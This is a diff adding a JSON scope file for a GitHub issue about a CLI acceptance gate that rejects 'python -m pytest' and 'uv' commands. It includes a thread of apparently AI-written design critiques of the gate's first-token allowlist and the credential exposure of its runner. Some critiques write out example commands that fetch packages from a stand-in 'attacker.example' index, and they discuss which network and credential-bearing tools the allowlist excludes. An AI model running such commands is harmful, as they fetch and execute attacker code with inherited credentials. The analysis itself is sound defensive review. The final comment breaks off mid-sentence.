@@ -1,0 +1,680 @@
+{
+  "xBRIEFInfo": {
+    "version": "0.8",
+    "description": "Scope xBRIEF ingested from GitHub issue #4702",
+    "updated": "2026-09-22T14:08:45Z"
+  },
+  "plan": {
+    "title": "UAT Tester 6: verify:ac rejects python -m pytest on a Python project",
+    "status": "completed",
+    "narratives": {
+      "Description": "UAT Tester 6: verify:ac rejects python -m pytest on a Python project",
+      "Origin": "Ingested from https://github.com/deftai/directive/issues/4702",
+      "Overview": "\n\n- A Python test command is a closed argv grammar in the style of the vitest and npx grammars: python -m pytest, python3 -m pytest, and py -m pytest, or a pytest token, denying other interpreter modes and modules, with negative cases for pip install, http.server, and python -c.\n- The stamp path runs the same first-token and argument check the run path runs, so a doomed command is refused where it is written.\n- The token set stays a static list in safety.ts. Runner detection may choose remediation text only.\n- The uv command that resolves or installs dependencies stays on #4849.\n- go test stays out of this remainder. node --test stays on #4751.\n- Acceptance commands still spawn with shell true and the process environment. This map records that residual.\n- Bare deft check root inference stays with closed #4722.\n\n\n",
+      "Labels": "bug, agent-experience, area:cli, design-critique:ingest-ready, focused-test-pass-1, framework-gap"
+    },
+    "items": [
+      {
+        "title": "A Python test command is a closed argv grammar in the style of the vitest and npx grammars: python -m pytest, python3 -m pytest, and py -m pytest, or a pytest token, denying other interpreter modes and modules, with negative cases for pip install, http.server, and python -c.",
+        "status": "completed",
+        "id": "clause.1",
+        "x-directive/evidence": {
+          "kind": "test",
+          "pointer": "packages/core/src/literal-acceptance/safety-branches.test.ts",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      },
+      {
+        "title": "The stamp path runs the same first-token and argument check the run path runs, so a doomed command is refused where it is written.",
+        "status": "completed",
+        "id": "clause.2",
+        "x-directive/evidence": {
+          "kind": "test",
+          "pointer": "packages/core/src/product-first-done-gate/acceptance.ts",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      },
+      {
+        "title": "The token set stays a static list in safety.ts. Runner detection may choose remediation text only.",
+        "status": "completed",
+        "id": "clause.3",
+        "x-directive/evidence": {
+          "kind": "test",
+          "pointer": "packages/core/src/literal-acceptance/safety.ts",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      },
+      {
+        "title": "The uv command that resolves or installs dependencies stays on #4849.",
+        "status": "completed",
+        "id": "clause.4",
+        "x-directive/evidence": {
+          "kind": "test",
+          "pointer": "packages/core/src/literal-acceptance/safety-branches.test.ts",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      },
+      {
+        "title": "go test stays out of this remainder. node --test stays on #4751.",
+        "status": "completed",
+        "id": "clause.5",
+        "x-directive/evidence": {
+          "kind": "test",
+          "pointer": "packages/core/src/literal-acceptance/safety-branches.test.ts",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      },
+      {
+        "title": "Acceptance commands still spawn with shell true and the process environment. This map records that residual.",
+        "status": "completed",
+        "id": "clause.6",
+        "x-directive/evidence": {
+          "kind": "review",
+          "pointer": "packages/core/src/literal-acceptance/run.ts",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      },
+      {
+        "title": "Bare deft check root inference stays with closed #4722.",
+        "status": "completed",
+        "id": "clause.7",
+        "x-directive/evidence": {
+          "kind": "review",
+          "pointer": "https://github.com/deftai/directive/issues/4722",
+          "recorded_at": "2026-09-22T14:10:00Z",
+          "recorded_by": "closer/4865"
+        }
+      }
+    ],
+    "tags": [
+      "bug",
+      "agent-experience",
+      "area:cli",
+      "design-critique:ingest-ready",
+      "focused-test-pass-1",
+      "framework-gap"
+    ],
+    "references": [
+      {
+        "uri": "https://github.com/deftai/directive/issues/4702",
+        "type": "x-xbrief/github-issue",
+        "title": "Issue #4702: UAT Tester 6: verify:ac rejects python -m pytest on a Python project"
+      }
+    ],
+    "acceptance": {
+      "commands": [],
+      "none_stated": true,
+      "source_rung": "derived",
+      "derived_reason": "derived 7 independently testable clauses from the task statement before product edit (#3323)",
+      "clauses": [
+        {
+          "id": 1,
+          "text": "A Python test command is a closed argv grammar in the style of the vitest and npx grammars: python -m pytest, python3 -m pytest, and py -m pytest, or a pytest token, denying other interpreter modes and modules, with negative cases for pip install, http.server, and python -c.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        },
+        {
+          "id": 2,
+          "text": "The stamp path runs the same first-token and argument check the run path runs, so a doomed command is refused where it is written.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        },
+        {
+          "id": 3,
+          "text": "The token set stays a static list in safety.ts. Runner detection may choose remediation text only.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        },
+        {
+          "id": 4,
+          "text": "The uv command that resolves or installs dependencies stays on #4849.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        },
+        {
+          "id": 5,
+          "text": "go test stays out of this remainder. node --test stays on #4751.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        },
+        {
+          "id": 6,
+          "text": "Acceptance commands still spawn with shell true and the process environment. This map records that residual.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        },
+        {
+          "id": 7,
+          "text": "Bare deft check root inference stays with closed #4722.",
+          "artifact_path": null,
+          "ambiguous": false,
+          "provenance": "statement"
+        }
+      ],
+      "ambiguity_attestation": "none_found"
+    },
+    "metadata": {
+      "intended_placement": {
+        "schema": "deft.scope.intended_placement.v1",
+        "files": [],
+        "module_boundary": ""
+      },
+      "issueCommentThread": [
+        {
+          "body": "## Additional reproduction: `uv` + pytest rejected on macOS with 0.119.6\n\nConfirmed on 2026-09-21 in the minnowScan consumer project (Rust CLI with local Python dashboard scripts/tests).\n\n### Version checks\n\n- macOS, zsh; local agent session in Warp.\n- `directive --version`: `@deftai/directive (engine: @deftai/directive-core@0.119.6)`.\n- Project content: `xbrief/.deft-version` is `0.119.6`; `directive doctor --full` also resolves content v0.119.6.\n- `npm view @deftai/directive version`: `0.119.6` at the time of verification. Engine and content were already current; no newer published release was available.\n\n### Reproduction and actual result\n\nThe active scope, `xbrief/active/2026-09-21-visual-scan-report.xbrief.json`, records this derived command in `plan.acceptance.commands`:\n\n```sh\nuv run --no-project --with pytest --with pytest-cov --with pytest-mock --with playwright python -m pytest tests/test_scan_report.py tests/test_scan_server.py\n```\n\nRunning `deft check` from the consumer root stops at `verify:ac` **before executing pytest**:\n\n```text\nfirst token \"uv\" is not in the literal-AC allowlist\nacceptance verdict (#3497): safety-rejected\ncheck: gate verify:ac failed (exit 201)\n```\n\nThe same rejection reproduced after the latest-version check and `directive doctor --full`. Bare `deft check` resolves the project/framework roots here, so we are not reproducing the separate root-inference problem in the original report.\n\n### Independent product checks\n\nThis direct invocation succeeds outside the acceptance gate:\n\n```sh\nuv run --no-project --with pytest --with pytest-cov --with pytest-mock --with playwright python -m pytest tests/test_scan_report.py tests/test_scan_server.py -q --cov=scripts --cov-branch --cov-report=term-missing --cov-fail-under=85\n```\n\nResult: **134 passed**, **97.67% combined Python branch-aware coverage**. The suite includes fake-runner HTTP/lifecycle tests and real Chrome interactions. Ruff and strict mypy also pass. These results do not imply that the Deft gate passed or that live Bluetooth hardware validation is complete.\n\n### Expected behavior\n\nProvide a vetted Python/uv pytest invocation supported by literal AC, or document and validate a supported equivalent before a scope records a command the gate cannot run. This `uv run --with` form can resolve/install test dependencies, so the request is for a reviewed command shape—not blanket approval of arbitrary `uv` or interpreter commands.\n\nNo allowlist, gate definition, or policy was weakened to obtain these results. Nothing has been removed from the recorded acceptance command to bypass the rejection.\n\n",
+          "id": 5767179274,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5767179274",
+          "user": {
+            "login": "rockbox37",
+            "id": 32502675,
+            "node_id": "MDQ6VXNlcjMyNTAyNjc1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/32502675?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/rockbox37",
+            "html_url": "https://github.com/rockbox37",
+            "followers_url": "https://api.github.com/users/rockbox37/followers",
+            "following_url": "https://api.github.com/users/rockbox37/following{/other_user}",
+            "gists_url": "https://api.github.com/users/rockbox37/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/rockbox37/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/rockbox37/subscriptions",
+            "organizations_url": "https://api.github.com/users/rockbox37/orgs",
+            "repos_url": "https://api.github.com/users/rockbox37/repos",
+            "events_url": "https://api.github.com/users/rockbox37/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/rockbox37/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-21T20:38:09Z",
+          "updated_at": "2026-09-21T20:38:09Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: triage\n```\n\ndesign-critique: warranted, because a normal Python consumer acceptance command is safety-rejected before pytest runs, and the closed first-token allowlist is the premise a critic can refute.\n\nmechanism-shaped: true\n\narc-mode: no-ingest\nyolo-standing: yes\norigin-ref: origin/HEAD\ndispatch-sha: 39c7fda2ce57f02e7cdb90eb0200a7c4543f0978\n\ncharter: refutation\ncharter-why: the issue names a defensible presumption with a refutation target\nspend: N≥3\nspend-ask: resolved\n\nDual-stop cap: 3 round-1 critic posts; a fourth post needs an operator raise\n\ndest: C:\\Users\\msada\\.grok\\worktrees\\deft-directive\\issue-4702-dc\n\nrefutation-target: first token python or uv on a consumer literal AC (python -m pytest, or uv run … python -m pytest) must pass evaluateCommandSafety; the #3267 closed allowlist is a consumer bug rather than the ambient-authority control.\n\ntarget: #4702\ntarget-shape: single-issue (default)\naudit-targets: none\n\npain: P1\n\n## Gate stamp\n\nP1 is the literal-AC safety reject. UAT Tester 6 on @deftai/directive@0.119.1: deft check failed verify:ac with first token \"python\" not in the literal-AC allowlist, acceptance verdict safety-rejected, before pytest ran. Comment 5767179274 adds the same reject for first token \"uv\" on macOS with engine 0.119.6 (uv run --no-project --with pytest … python -m pytest), exit 201. No open PR, no duplicate, no WIP on origin/master.\n\nPin-read at dispatch-sha 39c7fda2ce57f02e7cdb90eb0200a7c4543f0978:\n\n- packages/core/src/literal-acceptance/safety.ts ALLOWED_FIRST_TOKENS (lines 40-50): task, deft, directive, pnpm, npm, npx, yarn, bun, vitest. python, pytest, and uv are absent.\n- evaluateCommandSafety (lines 275-279) returns the first-token allowlist reject before any pytest argv runs.\n- The comment above that set says network/SCM tools are excluded because they retain ambient credentials, and only these tokens may spawn.\n\nOut of this arc: closed #4722 owns bare deft check requiring --framework-root and --project-root. That usability note is not P1. This is not a duplicate of #4766. No ingest from this parent.",
+          "id": 5769238290,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769238290",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-21T23:53:47Z",
+          "updated_at": "2026-09-21T23:53:47Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: parent\n```\n\npanel-deposit\nround: 1\nsiblings: 3\ninput-ceiling: 5769260408\nfamilies: grok, claude, codex",
+          "id": 5769260408,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769260408",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-21T23:56:33Z",
+          "updated_at": "2026-09-21T23:56:33Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: gpt-5\n```quarantined\nrole: critic\n```\n\naudit-targets: none\n\n1. **blocks-the-design** — The joined premise that first-token `python` *or* `uv` should pass the current evaluator cannot bind as written. Evidence: at `39c7fda2ce57f02e7cdb90eb0200a7c4543f0978`, `safety.ts` sends only framework wrappers, package managers, and `vitest` through argument-specific restrictions; every other allowlisted token would fall through to `ok`. `run.ts` then executes the accepted string with `shell: true` and the full `process.env`. Comment 5767179274 also establishes that the reproduced `uv --with` form may resolve/install dependencies. The concrete failure mode of merely adding `uv` is acceptance of arbitrary `uv run` payloads, including dependency-resolving commands that execute fetched code with ambient credentials. Disposition: split `uv` from the Python test-runner case; do not bind a blanket `uv` first-token exception. A supported uv form needs an exact, fail-closed grammar that excludes dependency resolution/arbitrary launched binaries, or a separate constrained runner.\n\n2. **sharpens-framing** — `python -m pytest` is supportable only as a command shape, not as a bare first-token addition. Evidence: `evaluateCommandSafety` has no generic second-stage validator; a newly inserted token with no dedicated branch returns success. The concrete failure mode is that the same change would admit `python -c ...`, `python some-script.py`, and `python -m pip ...`, not just pytest. Disposition: scope the design to explicit interpreter aliases plus the exact `-m pytest` family, deny other interpreter modes/modules, and add negative regression cases alongside the reproduced positive command.\n\n3. **sharpens-framing** — The existing trust boundary is provenance promotion plus launcher narrowing, not a sandbox. Evidence: `runLiteralAcceptanceCommands` keeps `source=task_statement` capture-only until a matching agent-promoted peer exists, but the default runner inherits the complete environment; existing `pnpm test`, `task test`, and `vitest run` forms already execute project-controlled code. The concrete failure mode is framing the closed first-token set as if it prevents test code from exercising ambient authority, which it does not. Disposition: preserve promotion, the rejected-command ledger, and the current metacharacter checks, but state this change as narrow Python test-runner parity and record the residual ambient-environment risk.\n\nRoad not taken: blanket allowlisting both executables. The strongest case for it is ecosystem parity—normal green Python tests are rejected while JavaScript test entry points pass—but that flips my verdict only for a dedicated `python -m pytest` validator. It does not justify `uv --with` dependency resolution under the same exception.",
+          "id": 5769333368,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769333368",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:05:46Z",
+          "updated_at": "2026-09-22T00:05:46Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: claude-opus-5\n```quarantined\nrole: critic\n```\n\naudit-targets: none\n\n## Re-verification at 39c7fda\n\nThere is no `node_modules` in the dest, so instead of retyping the table I parsed `ALLOWED_FIRST_TOKENS`, `SHELL_META_CHARS` and `NOOP_FIRST_TOKENS` straight out of `packages/core/src/literal-acceptance/safety.ts` at the dispatch SHA and ran the branch sequence of `evaluateCommandSafety` (lines 246-307) over that tree-sourced data. Tree data, transcribed control flow, not the compiled module.\n\nBoth write-back anchors hold. The set is exactly nine tokens (task, deft, directive, pnpm, npm, npx, yarn, bun, vitest); `python`, `python3`, `pytest`, `py`, `uv`, `poetry`, `tox`, `cargo`, `go`, `make` are all absent, and the 275-279 reject fires before anything spawns. Three further facts came out of the same run, and the findings rest on those rather than on the anchors.\n\n**Mechanism inventory before proposing anything.** Six controls already sit on this path: the capture recognizer regex (`capture.ts:30`, which already matches python/py/pytest/uv/pip/poetry alongside curl/gh/git), the capture rejected-ledger (`pushCommand`, `capture.ts:123-128`), `evaluateNoopDenylist`, `evaluateCommandSafety` first-token plus a per-token argument grammar, the `EXECUTABLE_LITERAL_SOURCES` provenance gate (`types.ts:23-28`) holding `task_statement` capture-only until an agent promotes it, and `evaluateStampAcceptanceSafety`. Two further notions of test-shaped command live outside this module: `check/runner-detect.ts` (`TestRunnerKind`) and `authz/classify.ts:113` (`TEST_BINS`). Nothing here needs a seventh list; the findings are about which of the six is in the wrong place.\n\n## blocks-the-design: the refutation target fuses two commands with opposite safety properties, and the `uv` half is the control working\n\nEvidence. `evaluatePackageManagerArgs` (`safety.ts:349-406`) denies `npx <pkg>` with the stated reason that it would resolve arbitrary registry packages with inherited env (356-369), and denies every package-manager arg outside `test|exec vitest|run test|run check|--version` because arbitrary scripts and network installs are denied for ambient-authority (397-403). The command on 5767179274 is `uv run --no-project --with pytest --with pytest-cov --with pytest-mock --with playwright python -m pytest ...`. `uv run --with` resolves and installs four PyPI distributions into an ephemeral environment before executing an interpreter, and the playwright install pulls browser binaries. That is the npx-registry shape the gate already refuses, transposed from npm to PyPI. The reporter says so in the same comment: not blanket approval of arbitrary `uv`.\n\nFailure mode. `uv run --with requests --index-url https://attacker.example/simple python -m pytest tests` is 96 characters, contains no character in `SHELL_META_CHARS`, and under a premise that admits `uv` as a first token it reaches `spawnSync`. It fetches and executes attacker-chosen code before a single assertion runs. The identical npm phrasing is refused today.\n\nDisposition consequence. The recorded premise cannot bind as one claim over both commands. `python -m pytest` is an execution-surface gap; `uv run --with` is a request to relax a control this module states in its own comments. If `uv` is admitted at all it needs its own argument grammar in the same style as the other eight tokens: refuse any `uv run` carrying `--with`, `--with-requirements`, `--index`, `--index-url`, `--extra-index-url`, `--find-links` or `--refresh`, and require `--frozen` or `--no-sync` so resolution cannot reach the network. Split the target before a successor lean is written, or the arc binds a network-install path under a Python-parity heading.\n\n## blocks-the-design: must pass `evaluateCommandSafety` names the wrong mechanism location\n\nEvidence. Every one of the nine allowlisted tokens routes to an argument gate: task/deft/directive to `evaluateWrapperSubcommand` (313), pnpm/npm/npx/yarn/bun to `evaluatePackageManagerArgs` (349), vitest to `evaluateVitestArgs` (411). The probe found zero allowlisted tokens without one, which makes the bare `return { ok: true, reason: null }` at line 306 unreachable at this SHA. The invariant is not \"allowlisted first token\"; it is \"allowlisted first token implies a per-token argument grammar\". A set insertion satisfying the premise as written would make `python` the first and only unrestricted entry, and the most powerful possible one.\n\nFailure mode. Verified against the tree-sourced set: `python -m pip install requests`, `python -m http.server 8000`, and `python -m pip download evil --index-url https://attacker.example/simple` each clear the length check, the no-op denylist, the metacharacter scan and the path-like check. `ALLOWED_FIRST_TOKENS` is the only thing refusing them.\n\nInjection / swarm lens, which fires because the target changes an untrusted-input-to-execution surface. `safety.ts:4` states the premise plainly: stored commands may originate from issue text. The execution end is `defaultLiteralAcceptanceRunner` (`run.ts:33-44`) with `shell: true` and `env: process.env`, no scrubbing, so `GH_TOKEN`, `NPM_TOKEN` and cloud credentials are present at spawn. The ambient-credentials rationale at `safety.ts:34-39` is therefore live, not historical, and for a bare `python` first token the allowlist is the ambient-authority control, which is exactly what the recorded premise denies.\n\nI am not resting this on `EXECUTABLE_LITERAL_SOURCES` being bypassed. It is a real second control and `task_statement` is genuinely capture-only. But promotion is performed by an agent that is itself reading the untrusted text, so the safety case cannot end at promotion judgment. The deterministic control that has to survive is the argument grammar. Consequence: the successor lean specifies a Python argument grammar, and `pytest` is the better token than `python` because `pytest` structurally cannot reach `-m pip`.\n\n## sharpens-framing: this is not a Python consumer gap, it is deft refusing its own recommended command\n\nEvidence. `check/runner-detect.ts` supports four runners (`TestRunnerKind`, line 5). For a project with `pytest.ini`, `pyproject.toml` or `requirements.txt` it returns `pytest` (74-80) and prints `affectedConvention: \"pytest --testmon\"` (151-154). Probe results: `pytest --testmon` rejects on first token; `go test ./...` rejects on first token; `npx jest` clears the first-token gate and then dies inside `evaluatePackageManagerArgs`, which limits `npx` to vitest. Of the four runners deft itself detects, only vitest has a direct executable-AC path, with jest reachable only indirectly through an `npm test` script.\n\nFailure mode. `deft doctor` tells a Python consumer its runner is pytest and its convention is `pytest --testmon`, and `verify:ac` then refuses that exact string. The remedy the gate prints makes it a dead end: `acceptance-resolver.ts:82-83` says to promote a safe alternative into `plan.metadata.swarm.verify_commands`, and for a Python or Go project the set contains no safe alternative. The only admissible commands are `deft` and `task`, which re-enter the gate that is failing. An unsatisfiable remediation string is worse than a plain refusal, because the consumer burns the loop hunting for the alternative.\n\nDisposition consequence. Scope the lean as \"executable literal AC admits only Node-shaped runners\", not \"Python consumer allowlist gap\". That changes the acceptance criteria: at minimum pytest and go, each with a per-token grammar, and a remediation string that names the detected runner. Road not taken, recorded because it is the tempting fix: do not source the admissible set from the `runner-detect` heuristic. That heuristic keys on the presence of `pyproject.toml`, a consumer-controlled file, so an exec allowlist derived from it would be an allowlist the untrusted side can widen by adding an empty file. Keep the token set static in `safety.ts` and use `runner-detect` only to pick the remediation text.\n\n## sharpens-framing: the pain the issue actually reports lives in the stamp/run asymmetry, which the premise does not reach\n\nEvidence. `evaluateStampAcceptanceSafety` (`safety.ts:205-235`) calls `evaluateNoopDenylist` and never calls `evaluateCommandSafety`, checked programmatically against the function body rather than by eye. Its three call sites in `product-first-done-gate/acceptance.ts` (126, 289, 354) narrow it further; 126 surfaces the error only when `isNoopRefusalReason` is true. The capture path, by contrast, does run the full check and diverts failures to a rejected ledger (`capture.ts:123-128`). So captured commands are filtered at intake, while a derived or stamped command, which is what 5767179274 shows with a `uv` line sitting in `plan.acceptance.commands`, is admitted with no first-token check and refused only when `deft check` tries to run it.\n\nFailure mode. A swarm worker derives an AC, the scope file accepts it silently, the work lands, and the gate refuses at the end of the loop. That is the second Expected bullet of the issue, stated as a mechanism rather than a wish.\n\nDisposition consequence. Widening the token set fixes this instance and leaves the class: the next Rust, Make or dotnet consumer reproduces this report verbatim against the widened set, because the stamp path still admits anything the runner will later refuse. The successor lean should carry a second criterion, that the stamp path runs the same first-token check the run path runs, so a doomed AC is refused where it is written. That criterion is independent of which tokens are admitted, so it can bind even if the token question stays open.\n\n## Steelman, and what would flip me\n\nThe strongest version of the recorded premise: the gate exists to stop ambient credential reuse, curl and gh and git and docker are excluded because they carry tokens, `python -m pytest` carries none, so refusing it over-blocks and buys nothing, since a worker determined to run pip will run it outside the AC gate anyway. That argument wins if the AC spawn is confined. It is not: `run.ts:38-43` passes `env: process.env` with `shell: true`, so the spawn inherits every credential in the session. If a scrubbed-env, no-network runner for acceptance commands lands, my second finding drops to a footnote, the allowlist becomes defense-in-depth rather than the control, and a bare `python` token becomes arguable. At this SHA that confinement does not exist.\n\n## footnote\n\nThe write-back out-of-arc carve-out matches the evidence I can see: the bare `deft check` root-inference complaint is a separate defect, and `uv` already appearing in the `capture.ts:30` recognizer confirms this is a deliberate recognize-broadly, execute-narrowly split rather than phantom-command parsing. Recorded so the census is complete; it carries no disposition weight.\n\n",
+          "id": 5769345992,
+          "html_url": "https://github.com/deftai/directive/issues/4702#issuecomment-5769345992",
+          "user": {
+            "login": "MScottAdams",
+            "id": 59447805,
+            "node_id": "MDQ6VXNlcjU5NDQ3ODA1",
+            "avatar_url": "https://avatars.githubusercontent.com/u/59447805?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/MScottAdams",
+            "html_url": "https://github.com/MScottAdams",
+            "followers_url": "https://api.github.com/users/MScottAdams/followers",
+            "following_url": "https://api.github.com/users/MScottAdams/following{/other_user}",
+            "gists_url": "https://api.github.com/users/MScottAdams/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/MScottAdams/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/MScottAdams/subscriptions",
+            "organizations_url": "https://api.github.com/users/MScottAdams/orgs",
+            "repos_url": "https://api.github.com/users/MScottAdams/repos",
+            "events_url": "https://api.github.com/users/MScottAdams/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/MScottAdams/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "created_at": "2026-09-22T00:07:14Z",
+          "updated_at": "2026-09-22T00:07:14Z",
+          "author_association": "MEMBER"
+        },
+        {
+          "body": "model: grok-4.7\n```quarantined\nrole: critic\n```\n\naudit-targets: none\n\n## First-token admission spawns the installer\nblocks-the-design\n\nThe refutation target on comment 5769238290 says a consumer literal AC whose first token is python or uv (python -m pytest, or uv run … python -m pytest) must pass evaluateCommandSafety, and that the #3267 closed allowlist is a consumer bug rather than the ambient-authority control.\n\nRan evaluateCommandSafety loaded from packages/core/src/literal-acceptance/safety.ts at 39c7fda2ce57f02e7cdb90eb0200a7c4543f0978. The Stop 1 anchors match that file. The execution set is lines 40-50: task, deft, directive, pnpm, npm, npx, yarn, bun, vitest. Lines 275-279 return the first-token refusal before argv is read. The header at lines 35-38 names that set as the #3267 ambient-authority execution allowlist: network and SCM tools stay out because they retain ambient credentials, and wrappers and package managers still need the subcommand allowlists below. After the wrapper, package-manager, and vitest branches, line 306 returns ok with a null reason for any other allowlisted token.\n\nClosed function, this SHA:\n- python -m pytest tests/test_new.py -q returns ok false, first token python\n- python -m pytest returns ok false, first token python\n- uv run --no-project --with pytest --with pytest-cov --with pytest-mock --with playwright python -m pytest tests/test_scan_report.py tests/test_scan_server.py returns ok false, first token uv\n- curl https://example.com returns ok false, first token curl\nsafety-branches.test.ts line 20 locks python -m pytest to ok false in that same case as curl.\n\nSame function with only python and uv inserted into the set and no new branch:\n- both pytest strings return ok true, reason null\n- the uv --with string from comment 5767179274 returns ok true, reason null\n- python -m pip install requests returns ok true, reason null\n- python -m http.server returns ok true, reason null\n- uv pip install requests returns ok true, reason null\n- python -c with a parenthesised print stays false, because an opening parenthesis is a shell metacharacter. The module and installer strings contain none of that set.\nnpm install stays false (network install denied for ambient authority). npx some-evil-package stays false (registry packages denied for ambient authority). The inserted tokens are wider than the package managers already on the list.\n\ndefaultLiteralAcceptanceRunner in packages/core/src/literal-acceptance/run.ts calls spawnSync with shell true and env process.env (lines 38-42). A string that returns ok is a platform shell with the agent environment.\n\ncapture.ts CLI_START_RE already matches those python and uv strings, and it also matches curl. Ran that regex from this SHA: capture is true for python -m pytest tests/test_new.py -q, for a uv run --with pytest prefix, for curl https://example.com, and for task test. Capture records the shape. Execution refuses python, uv, and curl together.\n\nFailure mode: a worker-written plan.acceptance.commands string whose first token is python or uv, which is how both reports recorded their commands, spawns any meta-free interpreter or installer argv with ambient credentials. The reported pytest strings pass. python -m pip install, uv pip install, and python -m http.server pass with them.\n\nDisposition: do not bind a remedy that puts python or uv on ALLOWED_FIRST_TOKENS so evaluateCommandSafety returns ok. That premise does not survive. The safety reject before pytest runs remains the pain.\n\n## Pytest invocation and uv --with are different shapes\nsharpens-framing\n\nThe issue body commands are python -m pytest tests/test_new.py -q and python -m pytest tests/test_list.py -q. Comment 5767179274 is uv run --no-project --with pytest --with pytest-cov --with pytest-mock --with playwright python -m pytest tests/test_scan_report.py tests/test_scan_server.py. That comment asks for a reviewed command shape because the form can resolve and install dependencies, and it refuses blanket approval of arbitrary uv.\n\nOn this SHA the existing verification grammars already return ok: task test, npm test, pnpm test, npm run test, pnpm run check, npx vitest run, vitest run. git grep pytest at this SHA under packages/core/src/init-deposit found no match, so those verbs are not already a pytest stamp for the reported projects.\n\nFailure mode: one target that requires both first tokens to pass cannot be narrowed to a pytest argv without dropping the uv half, and cannot admit the uv half without the installer spawn measured above. A bind that treats comment 5767179274 as the same admission as python -m pytest ships uv run --with.\n\nDisposition: restate the target before bind. A closed python -m pytest argv, if one is bound later, belongs in the subcommand allowlists this file already uses for vitest and npx. uv run --with stays with the npx registry denial. The verification verbs that already return ok stay available. Do not bind a requirement that uv pass evaluateCommandSafety.\n\n## Anchors\nfootnote\n\nStop 1 lines 40-50 and 275-279 match this SHA. python, pytest, and uv are absent from the execution set. Bare deft check root inference stays outside this arc. verify-tools selectToolSpecs keeps python and uv off the unflagged consumer set (#4672). That predicate is separate from literal-AC execution.\n\n## Road not taken\n\nThree 